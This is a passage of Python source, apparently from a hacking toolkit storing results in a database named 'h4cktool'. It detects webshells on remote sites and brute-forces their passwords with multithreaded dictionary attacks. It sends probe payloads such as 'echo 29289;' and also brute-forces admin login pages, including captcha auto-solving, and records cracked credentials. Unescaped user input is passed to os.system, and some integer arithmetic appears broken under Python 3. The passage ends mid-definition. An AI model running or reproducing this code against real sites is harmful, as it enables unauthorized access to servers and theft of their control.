    #检测url是否为webshell,并检测是webshell需要用html中搜索到的表单爆破还是用一句话类型爆破方式爆破
    #返回结果为一个字典,有3个键值对
    #第一个键为是否是webshell,用y1表示,y1为True或者False
    #第二个键为webshell爆破方式,用y2表示
    #y2的值可能是
    #1>"biaodan_bao"(根据搜到的表单爆)
    #2>"direct_bao"(直接爆)
    #3>""(空字符串,对应url不是webshell)
    #4>"bypass"(对应url是一个webshll,且该webshell不用输入密码即可控制)
    #第三个键为在http_get请求url所得的三个关键元素:code,title,content
    #y3的值是一个字典{"code":code,"title":title,"content":content}   其中code的类型为str

    y1=False
    belong2github=False
    y2=""

    response_dict=get_response_key_value_from_url(url)
    code=response_dict['code']
    title=response_dict['title']
    content=response_dict['content']

    #过滤掉github.com里面的文件
    parsed=urlparse(url)
    pattern=re.compile(r"github.com")
    if re.search(pattern,parsed.netloc):
        belong2github=True

    #根据url中的文件名检测url是否为webshell
    strange_filename_pattern=re.compile(r"^(http).*(((\d){3,})|(/c99)|((\w){10,})|([A-Za-z]{1,5}[0-9]{1,5})|([0-9]{1,5}[A-Za-z]{1,5})|(/x)|(/css)|(/licen{0,1}se(1|2){0,1}s{0,1})|(hack)|(fuck)|(h4ck)|(/diy)|(/wei)|(/2006)|(/newasp)|(/myup)|(/log)|(/404)|(/phpspy)|(/b374k)|(/80sec)|(/90sec)|(/r57)|(/b4che10r)|(X14ob-Sh3ll)|(aspxspy)|(server_sync))\.((php(3|4|5){0,1})|(phtml)|(asp)|(asa)|(cer)|(cdx)|(aspx)|(ashx)|(asmx)|(ascx)|(jsp)|(jspx)|(jspf))$",re.I)
    if re.match(strange_filename_pattern,url) and belong2github==False and len(content)<8000:
        y1=True

    #根据title检测url是否为webshell
    strange_title_pattern=re.compile(r".*((shell)|(b374k)|(sec)|(sh3ll)|(blood)|(r57)|(BOFF)|(spy)|(hack)|(h4ck)).*",re.I)
    if title is not None and code==200:
        if re.search(strange_title_pattern,title) and belong2github==False and len(content)<8000:
            y1=True


    if title is None and code==200:
    #如果title为None,说明有可能是webshell,或者是正常的配置文件
        if len(content)==0:
            new_http_domain=get_http_domain_pattern_from_url(url)
            new_http_domain=new_http_domain[:-2]
            #print new_http_domain
            #配置文件匹配方法
            not_webshell_pattern=re.compile(r"%s/(((database)|(data)|(include))/)?((config)|(conn))\.((asp)|(php)|(aspx)|(jsp))" % new_http_domain,re.I)
            if re.search(not_webshell_pattern,url):
                y1=False
            else:
                y1=True
                y2="direct_bao"

        caidao_jsp_pattern=re.compile(r"->\|\|<-")
        if 0<len(content)<50 and re.search(caidao_jsp_pattern,content):
            #jsp的菜刀一句话
            y1=True
            y2="direct_bao"

    #根据返回的html内容中是否有关键字以及返回内容大小判断是否为webshell
    strang_filecontent_pattern=re.compile(r".*((shell)|(hack)|(h4ck)|(b374k)|(c99)|(spy)|(80sec)|(hat)|(black)|(90sec)|(blood)|(r57)|(b4che10r)|(X14ob-Sh3ll)|(server_sync)).*",re.I)
    if re.search(strang_filecontent_pattern,content) and len(content)<8000:
        y1=True

    #如果正常返回大小很小,说明有可能是一句话
    #1.返回结果为200且文件内容少且有关键字的为大马
    #2.返回结果为200且文件内容少且没有关键字的为一句话小马
    if y1==True and 200==code:
        webshell_flag=re.compile(r"(c:)|(/home)|(/var)|(/phpstudy)",re.I)
        if len(content)<8000 and re.search(r'''method=('|")?post('|")?''',content):
            y2="biaodan_bao"
        if len(content)>8000 and re.search(r'''method=('|")?post('|")?''',content) and re.search(webshell_flag,content):
            y2="bypass"

    #如果返回码为404且返回内容大小较小但是返回结果中没有url中的文件名,判定为404伪装小马
    if 404==code and len(content)<600:
        url=re.sub(r"(\s)$","",url)
        webshell_file_name=url.split("/")[-1]
        pattern=re.compile(r"%s" % webshell_file_name,re.I)
        if re.search(pattern,content):
            y1=False
            y2=""
        else:
            if re.search(r'''method=('|")?post('|")?''',content) is None:
                y1=True
                y2="direct_bao"
            else:
                y1=True
                y2="biaodan_bao"

    return {'y1':y1,'y2':'%s' % y2,'y3':{"code":code,"title":title,"content":content}}


def get_webshell_suffix_type(url):
    #获取url所在的webshell的真实后缀类型,结果为asp|php|aspx|jsp
    url=re.sub(r'(\s)$',"",url)
    parsed=urlparse(url)
    len1=len(parsed.scheme)
    len2=len(parsed.netloc)
    main_len=len1+len2+3
    len3=len(url)-main_len
    url=url[-len3:]

    #php pattern
    pattern=re.compile(r"\.((php)|(phtml)).*",re.I)
    if re.search(pattern,url):
        return "php"

    #asp pattern
    pattern1=re.compile(r"\.asp.*",re.I)
    pattern2=re.compile(r"\.aspx.*",re.I)
    if re.search(pattern1,url):
        if re.search(pattern2,url):
            return "aspx"
        else:
            return "asp"
    pattern=re.compile(r"\.((asa)|(cer)|(cdx)).*",re.I)
    if re.search(pattern,url):
        return "asp"

    #aspx pattern
    pattern=re.compile(r"\.((aspx)|(ashx)|(asmx)|(ascx)).*",re.I)
    if re.search(pattern,url):
        return "aspx"

    #jsp pattern
    pattern=re.compile(r"\.((jsp)|(jspx)|(jspf)).*",re.I)
    if re.search(pattern,url):
        return "jsp"

def get_http_domain_from_url(url):
    #eg.http://www.baidu.com/1/2/3.jsp==>http://www.baidu.com
    parsed=urlparse(url)
    http_domain_value=parsed.scheme+"://"+parsed.netloc
    #print http_domain_value
    return http_domain_value

def get_user_and_pass_form_from_html(html):
    #从html内容(管理员登录的html)中获取所有的form表单
    #返回结果为一个字典,包含2个键值对
    #"user_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为"None",不是返回""(空字符串)
    user_form_name=None
    pass_form_name=None
    user_pass_pattern=re.compile(r'''(<input .*type=('|")?text.*>)[\s\S]{,500}(<input .*type=('|")?password.*>)''',re.I)
    user_pattern=re.compile(r'''name=('|")?([^'" ]{,20})('|")?''',re.I)
    USER_PATTERN=re.compile(r'''(<input .*type=("|')?text("|')?.*>)''',re.I)
    pass_pattern=re.compile(r'''name=('|")?([^'" ]{,20})('|")?''',re.I)
    PASS_PATTERN=re.compile(r'''(<input .*type=("|')?password("|')?.*>)''',re.I)
    find_user_pass_form=re.search(user_pass_pattern,html)
    find_user_form=re.search(USER_PATTERN,html)
    find_pass_form=re.search(PASS_PATTERN,html)

    if find_user_pass_form and find_user_pass_form.group(1) is not None and find_user_pass_form.group(3) is not None:
        #既有user表单也有pass表单,标准的管理登录页面
        user_form_line=find_user_pass_form.group(1)
        user_form_name=re.search(user_pattern,user_form_line).group(2)
        pass_form_line=find_user_pass_form.group(3)
        pass_form_name=re.search(pass_pattern,pass_form_line).group(2)

    elif find_user_pass_form is None and find_user_form is not None:
        #只有user表单
        user_form_line=find_user_form.group(1)
        tmp=re.search(user_pattern,user_form_line)
        if tmp!=None and tmp.group(2)!=None:
            user_form_name=tmp.group(2)
    elif find_user_pass_form is None and find_pass_form is not None:
        #只有pass表单
        pass_form_line=find_pass_form.group(1)
        tmp=re.search(pass_pattern,pass_form_line)
        if tmp!=None and tmp.group(2)!=None:
            pass_form_name=tmp.group(2)

    return_value={'user_form_name':user_form_name,'pass_form_name':pass_form_name}
    #print return_value
    return return_value

def get_user_and_pass_form_from_url(url):
    #从url的get请求中获取所有form表单
    #返回结果为一个字典,包含3个键值对
    #"user_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"pass_form_name":"" 没有则相应返回值为None,不是返回""(空字符串)
    #"response_key_value":value 这个value的值是一个字典,也即get_response_key_value_from_url函数的返回结果
    #之所以要每次在有访问url结果的函数里面返回url访问结果,这样是为了可以只访问一次url,这样就可以一直将访问的返回结果传递下去,不用多访问,效率更高
    url=re.sub(r'(\s)$','',url)
    response_key_value=get_response_key_value_from_url(url)
    content=response_key_value['content']
    return_value=get_user_and_pass_form_from_html(content)
    return_value['response_key_value']=response_key_value
    #print return_value
    return return_value

def get_yanzhengma_form_and_src_from_url(url):
    #得到url对应的html中的验证码的表单名和验证码src地址
    parsed=urlparse(url)
    content=get_request(url)['content']
    yanzhengma_form_name=None
    yanzhengma_src=None
    #print content
    #user_pass_pattern=re.compile(r'''<input .*name=('|")?([^'"]{,7}(user)[^'"]{,7})('|")?.*>((\s).*){,15}.*<input .*name=('|")?([^'"]{,7}pass[^'"]{,7})('|").*>([\s\S]*)''',re.I)
    #上面这个pattern会找很久还不一定找得到,换成下面的pattern就可以很快找出来了
    user_pass_pattern=re.compile(r'''<input .*name=('|")?([^'"]{,7}user[^'"]{,7}).*>[\s\S]{,500}<input .*name=('|")?([^'"]{,7}pass[^'"]{,7}).*>([\s\S]*)''',re.I)
    find_user_pass_form=re.search(user_pass_pattern,content)
    if find_user_pass_form and find_user_pass_form.group(2) is not None and find_user_pass_form.group(4) is not None:
        #user和pass表单之后剩下的内容
        content_left=find_user_pass_form.group(5)
        yanzhengma_pattern=re.compile(r'''<input .*name=('|")?([^'" ]{,20})('|")?.*>''',re.I)
        yanzhengma_src_pattern=re.compile(r'''<img .*src=('|")?([^'" ]{,80})('|")?.*>''',re.I)
        find_yanzhengma=re.search(yanzhengma_pattern,content_left)
        find_yanzhengma_src=re.search(yanzhengma_src_pattern,content_left)
        if find_yanzhengma and find_yanzhengma_src:
            #目前认为只有同时出现验证码和验证码src的html才是有验证码的,否则如"记住登录"的选项会被误认为是验证码
            yanzhengma_form_name=find_yanzhengma.group(2)
            #print yanzhengma_form_name
            if find_yanzhengma_src:
                yanzhengma_src=find_yanzhengma_src.group(2)
                #print yanzhengma_src
                if re.match(r"http.*",yanzhengma_src):
                    yanzhengma_src_url=yanzhengma_src
                else:
                    pure_url=parsed.scheme+"://"+parsed.netloc+parsed.path
                    yanzhengma_src_url=url[:(len(pure_url)-len(pure_url.split("/")[-1]))]+yanzhengma_src
            return {'yanzhengma_form_name':yanzhengma_form_name,'yanzhengma_src':yanzhengma_src_url}
    return None

def crack_ext_direct_webshell_url(url,pass_dict_file,ext):
    #爆破php|asp|aspx|jsp的一句话类型的webshell
    #表单形式爆破的webshell爆破起来方法一样,不用分类,一句话形式的webshell爆破需要根据后缀对应的脚本的语法的不同来爆破
    def ext_direct_webshell_crack_thread(xxx_todo_changeme):
        (password,url,ext) = xxx_todo_changeme
        if get_flag[0]==1:
            return
        if ext in ["php","asp","aspx"]:
            pattern=re.compile(r"29289",re.I)
        if ext=="jsp":
            pattern=re.compile(r"->\|.+\|<-",re.I)


        if ext=="php":
            #php的echo 29289后面必须加分号
            values={'%s' % password:'echo 29289;'}
        elif ext=="asp":
            #asp后面不能加分号
            values={'%s' % password:'response.write("29289")'}
        elif ext=="aspx":
            #aspx后面可加可不加分号
            values={'%s' % password:'Response.Write("29289");'}
        elif ext=="jsp":
            #jsp一句话比较特殊,似乎没有直接执行命令的post参数
            #A后面没有分号
            #jsp一句话中:
            #A参数是打印当前webshell所在路径,post A参数返回内容如下
            #->|路径|<-  (eg.->|/home/llll/upload/custom |<-)
            #B参数是列目录
            #C参数是读文件
            #D,E,F,....参考jsp菜刀一句话服务端代码
            values={'%s' % password:'A'}

        data = urllib.parse.urlencode(values)
        try_time[0]+=1

        #post_request可处理表单post和无表单post,以及code=404的状况
        html=post_request(url,values)

        PASSWORD="("+password+")"+(52-len(password))*" "
        sys.stdout.write('-'*(try_time[0]/(sum[0]/100))+'>'+str(try_time[0]/(sum[0]/100))+'%'+' %s/%s %s\r' % (try_time[0],sum[0],PASSWORD))
        sys.stdout.flush()

        if re.search(pattern,html):
            get_flag[0]=1
            end=time.time()
            #print "\b"*30
            #sys.stdout.flush()
            print(Fore.RED+"congratulations!!! webshell cracked succeed!!!")
            string="cracked webshell:%s password:%s" % (url,password)
            print(Fore.RED+string)
            print("you spend time:"+str(end-start[0]))
            http_domain_value=get_http_domain_from_url(url)
            #经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
    def crack_ext_direct_webshell_url_inside_func(url,pass_dict_file,ext):
        urls=[]
        exts=[]
        passwords=[]
        i=0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file=input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f=open(pass_dict_file,"r+")
        for each in f:
            urls.append(url)
            exts.append(ext)
            each=re.sub(r"(\s)$","",each)
            passwords.append(each)
            i+=1
        f.close()
        sum[0]=i
        start[0]=time.time()

        #这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可参考下面文章
        #后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        #http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        pool=ThreadPool(20)
        #这里要用map,用map_async后面的pool.join()没有达到阻塞的效果,后来试了下又好像是Fore的问题,解决Fore的问题后再换成map_async又可以了,后面的pool.join()又可以阻塞了
        results_list=pool.map_async(ext_direct_webshell_crack_thread,list(zip(passwords,urls,exts)))
        pool.close()
        pool.join()


    #这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    #且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init,Fore
        init(autoreset=True)
    except:
        os.system("pip install colorama")
        from colorama import init,Fore
        init(autoreset=True)

    get_flag=[0]
    try_time=[0]
    sum=[0]
    start=[0]

    crack_ext_direct_webshell_url_inside_func(url,pass_dict_file,ext)
    return get_flag[0]



def crack_admin_login_url(url,user_dict_file="dicts/user.txt",pass_dict_file="dicts/pass.txt"):
    #爆破管理员后台登录url,尝试自动识别验证码,如果管理员登录页面没有验证码,加了任意验证码数据也可通过验证
    figlet2file("cracking admin login url","",True)
    print("cracking admin login url:%s" % url)
    print("正在使用吃奶的劲爆破管理员登录页面...")

    def crack_admin_login_url_thread(xxx_todo_changeme1):
        (url,username,password) = xxx_todo_changeme1
        if get_flag[0]==1:
            return

        if has_yanzhengma[0]==False:
            values={'%s' % user_form_name:'%s' % username,'%s' % pass_form_name:'%s' % password}
        else:
            yanzhengma_form_name=get_yanzhengma_form_and_src_from_url(url)['yanzhengma_form_name']
            yanzhengma_src=get_yanzhengma_form_and_src_from_url(url)['yanzhengma_src']
            yanzhengma=get_string_from_url_or_picfile(yanzhengma_src)
            values={'%s' % user_form_name:'%s' % username,'%s' % pass_form_name:'%s' % password,'%s' % yanzhengma_form_name:'%s' % yanzhengma}

        try_time[0]+=1
        html=post_request(url,values)
        USERNAME_PASSWORD="("+username+":"+password+")"+(52-len(password))*" "
        #每100次计算完成任务的平均速度
        left_time=get_remain_time(start[0],biaoji_time[0],remain_time[0],100,try_time[0],sum[0])
        remain_time[0]=left_time
        sys.stdout.write('-'*(try_time[0]/(sum[0]/100))+'>'+str(try_time[0]/(sum[0]/100))+'%'+' %s/%s  remain time:%s  %s\r' % (try_time[0],sum[0],remain_time[0],USERNAME_PASSWORD))
        sys.stdout.flush()

        if len(html)>logined_least_length:
            #认为登录成功
            get_flag[0]=1
            end=time.time()
            print(Fore.RED+"congratulations!!! admin login url cracked succeed!!!")
            string="cracked admin login url:%s username and password:(%s:%s)" % (url,username,password)
            print(Fore.RED+string)
            print("you spend time:"+str(end-start[0]))
            http_domain_value=get_http_domain_from_url(url)
            #经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
            return {'username':username,'password':password}
    def crack_admin_login_url_inside_func(url,username,pass_dict_file):
        #urls和usernames是相同内容的列表
        urls=[]
        usernames=[]
        #passwords是pass_dict_file文件对应的所有密码的集合的列表
        passwords=[]
        i=0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file=input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f=open(pass_dict_file,"r+")
        for each in f:
            urls.append(url)
            usernames.append(username)
            each=re.sub(r"(\s)$","",each)
            passwords.append(each)
            i+=1
        f.close()
        sum[0]=usernames_num*i

        pool=ThreadPool(20)
        results_list=pool.map_async(crack_admin_login_url_thread,list(zip(urls,usernames,passwords)))
        pool.close()
        pool.join()
    #用的时候导入Fore等模块,因为它们与tab_complete_for_file_path函数冲突
    try:
        from colorama import init,Fore
        init(autoreset=True)
    except:
        os.system("pip install colorama")
        from colorama import init,Fore
        init(autoreset=True)

    get_result=get_user_and_pass_form_from_url(url)
    user_form_name=get_result['user_form_name']
    pass_form_name=get_result['pass_form_name']
    #print user_form_name
    #print pass_form_name
    #raw_input()
    if user_form_name==None:
        print("user_form_name is None")
        return
    if pass_form_name==None:
        print("pass_form_name is None")
        return
    unlogin_length=len(get_result['response_key_value']['content'])
    #如果post数据后返回数据长度超过未登录时的0.5倍则认为是登录成功
    logined_least_length=unlogin_length+unlogin_length/2
    get_flag=[0]
    try_time=[0]
    sum=[0]
    start=[0]

    #用来标记当前时间的"相对函数全局"变量
    biaoji_time=[0]
    #用来标记当前剩余完成时间的"相对函数全局"变量
    tmp=time.time()
    remain_time=[tmp-tmp]
    #current_username_password={}

    has_yanzhengma=[False]
    find_yanzhengma=get_yanzhengma_form_and_src_from_url(url)
    if find_yanzhengma:
        yanzhengma_form_name=find_yanzhengma['yanzhengma_form_name']
        yanzhengma_src=find_yanzhengma['yanzhengma_src']
        has_yanzhengma=[True]

    with open(r"%s" % user_dict_file,"r+") as user_file:
        pool=ThreadPool(20)
        all_users=user_file.readlines()
        usernames_num=len(all_users)
        start[0]=time.time()
        for username in all_users:
            #双层多线程,这里是username开多线程爆破
            username=re.sub(r'(\s)$','',username)
            pool.apply_async(crack_admin_login_url_inside_func,(url,username,pass_dict_file))
        pool.close()
        pool.join()
    return get_flag[0]

def crack_allext_biaodan_webshell_url(url,user_dict_file,pass_dict_file):
    #爆破表单类型的webshell
    #表单类型的webshell爆破方法一样,不用分不同脚本类型分别爆破
    def allext_biaodan_webshell_crack_thread(xxx_todo_changeme2):
        (password,url) = xxx_todo_changeme2
        if get_flag[0]==1:
            return
        pattern=re.compile(r".*((/home)|(c:)|(/phpstudy)|(/var)|(wamp)).*",re.I)
        values={'%s' % pass_form_name:'%s' % password}
        try_time[0]+=1
        html=post_request(url,values)


        PASSWORD="("+password+")"+(52-len(password))*" "
        sys.stdout.write('-'*(try_time[0]/(sum[0]/100))+'>'+str(try_time[0]/(sum[0]/100))+'%'+' %s/%s %s\r' % (try_time[0],sum[0],PASSWORD))
        sys.stdout.flush()

        if re.search(pattern,html) or len(html)-unlogin_length>8000:
            get_flag[0]=1
            end=time.time()
            print(Fore.RED+"congratulations!!! webshell cracked succeed!!!")
            string="cracked webshell:%s password:%s" % (url,password)
            print(Fore.RED+string)
            print("you spend time:"+str(end-start[0]))
            http_domain_value=get_http_domain_from_url(url)
            #经验证terminate()应该只能结束当前线程,不能达到结束所有线程
            write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
            return password
    def crack_allext_biaodan_webshell_url_inside_func(url,user_dict_file,pass_dict_file):
        urls=[]
        passwords=[]
        i=0
        while 1:
            if os.path.exists(pass_dict_file) is False:
                print("please input your password dict:>", end=' ')
                pass_dict_file=input()
                if os.path.exists(pass_dict_file) is True:
                    break
            else:
                break
        f=open(pass_dict_file,"r+")
        for each in f:
            urls.append(url)
            each=re.sub(r"(\s)$","",each)
            passwords.append(each)
            i+=1
        f.close()
        sum[0]=i
        start[0]=time.time()

        #这里如果用的map将一直等到所有字典尝试完毕才退出,map是阻塞式,map_async是非阻塞式,用了map_async后要在成功爆破密码的线程中关闭线程池,不让其他将要运行的线程运行,这样就不会出现已经爆破成功还在阻塞的情况了,可参考下面文章
        #后来试验似乎上面这句话可能是错的,要参照notes中的相关说明
        #http://blog.rockyqi.net/python-threading-and-multiprocessing.html
        pool=ThreadPool(20)
        #奇怪的是这里的map可用成map_async,而一句话的爆破函数要用map,不能用map_async
        results_list=pool.map_async(allext_biaodan_webshell_crack_thread,list(zip(passwords,urls)))
        pool.close()
        pool.join()

    #这里要注意的是Fore等模块的导入要在需要时才导入,它与tab_complete_for_file_path函数冲突
    #且导入的下面的语句也不能放到crack_webshell函数那里,那样ThreadPool.map()会无法知道Fore是个什么东西
    try:
        from colorama import init,Fore
        init(autoreset=True)
    except:
        os.system("pip install colorama")
        from colorama import init,Fore
        init(autoreset=True)

    user_dict_file="dicts/user.txt"
    pass_dict_file="dicts/webshell_passwords.txt"
    user_form_name=get_user_and_pass_form_from_url(url)['user_form_name']
    pass_form_name=get_user_and_pass_form_from_url(url)['pass_form_name']
    #这里如果字典中的返回键值对中的一个键对应的值为""(空字符串),那么返回的结果是"None"(一个叫做None的字符串)
    #print type(user_form_name)
    response_key_value=get_user_and_pass_form_from_url(url)['response_key_value']
    unlogin_length=len(response_key_value['content'])

    get_flag=[0]
    try_time=[0]
    sum=[0]
    start=[0]
    current_password=[""]

    if user_form_name!=None:
        while 1:
            if os.path.exists(user_dict_file) is False:
                print("please input your username dict:>", end=' ')
                user_dict_file=input()
                if os.path.exists(user_dict_file) is True:
                    break
            else:
                break


        crack_admin_login_url(url)

    else:
        if pass_form_name!=None:
            crack_allext_biaodan_webshell_url_inside_func(url,user_dict_file,pass_dict_file)

    return get_flag[0]


def crack_webshell(url,anyway=0):
    #webshll爆破,第二个参数默认为0,如果设置不为0,则不考虑判断是否是webshll,如果设置为1,直接按direct_bao方式爆破,如果设置为2,直接按biaodan_bao方式爆破

    figlet2file("cracking webshell","",True)
    print("cracking webshell --> %s" % url)
    print("正在使用吃奶的劲爆破...")


    ext=get_webshell_suffix_type(url)
    tmp=check_webshell_url(url)

    if anyway==1 or tmp['y2']=="direct_bao":
        return_value=crack_ext_direct_webshell_url(url,"dicts/webshell_passwords.txt",ext)
        if return_value==0:
            print("webshell爆破失败 :(")
            return
    if anyway==2 or tmp['y2']=="biaodan_bao":
        return_value=crack_allext_biaodan_webshell_url(url,"dicts/user.txt","dicts/webshell_passwords.txt")
        if return_value==0:
            print("webshell爆破失败 :(")
            return
    if tmp['y2']=="bypass":
        print(Fore.RED+"congratulations!!! webshell may found and has no password!!!")
        string="cracked webshell:%s no password!!!" % url
        print(Fore.RED+string)
        write_string_to_sql(string,"h4cktool","targets","scan_result","http_domain",http_domain_value)
        return

    else:
        print("这不是一个webshell :(")
        return


def database_init():
    #本地数据库初始化,完成数据库配置和建立数据(数据库和表)
    print("database init process,database and tables will be created here...")
    if os.path.exists("config.py"):
        f=open("config.py","r")
        all=f.readlines()
        f.close()
        config_file_abs_path=os.getcwd()+"/config.py"

        find_db_server=get_key_value_from_file("db_server",'',config_file_abs_path)
        if find_db_server:
            db_server=find_db_server
        else:
            print("can not find db_server")
            while 1:
                print("please input your database server addr:>", end=' ')
                db_server=input()
                if check_string_is_ip(db_server) is True:
                    os.system('''echo db_server='"'%s'"' >> %s''' % (db_server,config_file_abs_path))
                    break
                else:
                    print("your input may not be a regular ip addr:(")
                    continue
        print("db_server:"+db_server)

        find_db_user=get_key_value_from_file("db_user",'',config_file_abs_path)
        if find_db_user:
            db_user=find_db_user
        else:
            print("can not find db_user")
            print("please input your database username:>", end=' ')
            db_user=input()
            os.system('''echo db_user='"'%s'"' >> %s''' % (db_user,config_file_abs_path))
        print("db_user:"+db_user)

        find_db_pass=get_key_value_from_file("db_pass",'',config_file_abs_path)
        if find_db_pass:
            db_pass=find_db_pass
        else:
            print("can not find db_pass")
            print("please input your database password:>", end=' ')
            db_pass=input()
            os.system('''echo db_pass='"'%s'"' >> %s''' % (db_pass,config_file_abs_path))
        print("db_pass:"+db_pass)

        find_db_name=get_key_value_from_file("db_name",'',config_file_abs_path)
        if find_db_name:
            db_name=find_db_name
        else:
            print("can not find db_name")
            print("please input your database name you want to create,this database include two tables,and will store all the scan info,if you don't understand,input y|Y and system will use the default 'h4cktool' as database name,if you want to make your own database name,input n|N  default[y]:>", end=' ')
            choose=input()
            if choose!='n' and choose!='N':
                db_name="h4cktool"
            else:
                print("please input your database name you want to create:>", end=' ')
                db_name=input()
            os.system('''echo db_name='"'%s'"' >> %s''' % (db_name,config_file_abs_path))
        print("db_name:"+db_name)

        find_all_targets_table_name=get_key_value_from_file("all_targets_table_name",'',config_file_abs_path)
        if find_all_targets_table_name:
            all_targets_table_name=find_all_targets_table_name
        else:
            print("can not find all_targets_table_name")
            print("please inpout your table name for storing all targets and their info(if you don't understand,use the default one:'targets'),input y|Y for default 'targets' as all targets' table name,n|N to input your own table name as targets' table name. default[y]:>", end=' ')
            choose=input()
            if choose!='n' and choose!='N':
                all_targets_table_name="targets"
            else:
                print("please input your table name for storing all targets and their info:>", end=' ')
                all_targets_table_name=input()
            os.system('''echo all_targets_table_name='"'%s'"' >> %s''' % (all_targets_table_name,config_file_abs_path))
        print("all_targets_table_name:"+all_targets_table_name)

        find_all_urls_table_name=get_key_value_from_file("all_urls_table_name",'',config_file_abs_path)
        if find_all_urls_table_name:
            all_urls_table_name=find_all_urls_table_name
        else:
            print("can not find all_urls_table_name")
            print("please inpout your table name for storing all urls and their info(if you don't understand,use the default one:'urls'),input y|Y for default 'targets' as all targets' table name,n|N to input your own table name as targets' table name. default[y]:>", end=' ')
            choose=input()
            if choose!='n' and choose!='N':
                all_urls_table_name="urls"
            else:
                print("please input your table name for storing all urls and their info:>", end=' ')
                all_urls_table_name=input()
            os.system('''echo all_urls_table_name='"'%s'"' >> %s''' % (all_urls_table_name,config_file_abs_path))
        print("all_urls_table_name:"+all_urls_table_name)

    else:
        #config.py文件不存在
        try:
            os.system("touch config.py")
            config_file_abs_path=os.getcwd()+"/config.py"
            while 1:
                print("please input your database server addr:>", end=' ')
                db_server=input()
                if check_string_is_ip(db_server) is True:
                    os.system('''echo db_server='"'%s'"' >> config.py''' % db_server)
                    break
                else:
                    print("your input may not be a regular ip addr:(")
                    continue
            print("db_server:"+db_server)

            print("please input your database username:>", end=' ')
            db_user=input()
            os.system('''echo db_user='"'%s'"' >> %s''' % (db_user,config_file_abs_path))
            print("db_user:"+db_user)

            print("please input your database password:>", end=' ')
            db_pass=input()
            os.system('''echo db_pass='"'%s'"' >> %s''' % (db_pass,config_file_abs_path))
            print("db_pass:"+db_pass)

            print("please input your database name you want to create,this database include two tables,and will store all the scan info,if you don't understand,input y|Y and system will use the default 'h4cktool' as database name,if you want to make your own database name,input n|N  default[y]:>", end=' ')
            choose=input()
            if choose!='n' and choose!='N':
                db_name="h4cktool"
            else:
                print("please input your database name you want to create:>", end=' ')
                db_name=input()
            os.system('''echo db_name='"'%s'"' >> %s''' % (db_name,config_file_abs_path))
            print("db_name:"+db_name)

            print("please inpout your table name for storing all targets and their info(if you don't understand,use the default one:'targets'),input y|Y for default 'targets' as all targets' table name,n|N to input your own table name as targets' table name. default[y]:>", end=' ')
            choose=input()
            if choose!='n' and choose!='N':
                all_targets_table_name="targets"
            else:
                print("please input your table name for storing all targets and their info:>", end=' ')
                all_targets_table_name=input()
            os.system('''echo all_targets_table_name='"'%s'"' >> %s''' % (all_targets_table_name,config_file_abs_path))
            print("all_targets_table_name:"+all_targets_table_name)

            print("please inpout your table name for storing all urls and their info(if you don't understand,use the default one:'urls'),input y|Y for default 'targets' as all targets' table name,n|N to input your own table name as targets' table name. default[y]:>", end=' ')
            choose=input()
            if choose!='n' and choose!='N':
                all_urls_table_name="urls"
            else:
                print("please input your table name for storing all urls and their info:>", end=' ')
                all_urls_table_name=input()
            os.system('''echo all_urls_table_name='"'%s'"' >> %s''' % (all_urls_table_name,config_file_abs_path))
            print("all_urls_table_name:"+all_urls_table_name)

        except:
            print("create database config file error")


    #创建数据库db_name和两个表all_targets_table_name,all_urls_table_name
    try:
        import MySQLdb
    except:
        #for ubuntu16.04 deal with install MySQLdb error
        os.system("apt-get install libmysqlclient-dev")
        os.system("easy_install MySQL-python")
        os.system("pip3 install MySQLdb")
        import MySQLdb

    try:
        conn=MySQLdb.connect(db_server,db_user,db_pass,port=3306,charset="utf8")
        conn.autocommit(1)
        cur=conn.cursor()
        sql0="create database %s" % db_name
        #print sql0
        cur.execute(sql0)
        conn.select_db(db_name)
        #数据库中统一都用字符串形式存储各种数据
        sql1="create table %s(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
            cms_info text not null,urls mediumtext not null,sqlis text not null,like_admin_login_urls  text not null,\
            final_admin_login_url varchar(100) not null,cracked_admin_login_url_info text not\
            null,exist_webshell_urls text not null,cracked_webshell_url_info text not null,\
            sub_domains text not null,pang_domains text not null,whois_info text not null,\
            resource_files text not null,robots_and_sitemap text not null,scan_result mediumtext not null)" \
            % all_targets_table_name
        sql2="create table %s(url varchar(200) not null primary key,code varchar(50) not null,\
            title varchar(200) not null,content mediumtext not null,has_sqli varchar(50) not null,\
            is_upload_url varchar(50) not null,like_admin_login_url varchar(50) not null,\
            is_admin_login_url varchar(50) not null,http_domain varchar(70) not null)" \
            % all_urls_table_name
        #print sql1
        #print sql2
        cur.execute(sql1)
        cur.execute(sql2)
        #conn.commit()
    except:
        import traceback
        traceback.print_exc()
        #发生错误回滚
        conn.rollback()
        print("create database and two tables error")
    finally:
        cur.close()
        conn.close()

def get_value_from_url(url):
    #返回一个字典{'y1':y1,'y2':y2}
    #eg.从http://www.baidu.com/12/2/3.php?a=1&b=2中得到
    #'y1':"http://www.baidu.com/12/2/3.php"
    #'y2':"http://www.baidu.com/12/2"
    import urllib.parse
    import re
    url = re.sub('(\\s)$', '', url)
    parsed = urllib.parse.urlparse(url)
    y1 = parsed.scheme + '://' + parsed.netloc + parsed.path
    y2_len = len(y1) - len(y1.split('/')[-1]) - 1
    y2 = y1[:y2_len]
    return {
        'y1': y1,
        'y2': y2 }


def collect_urls_from_url(url):
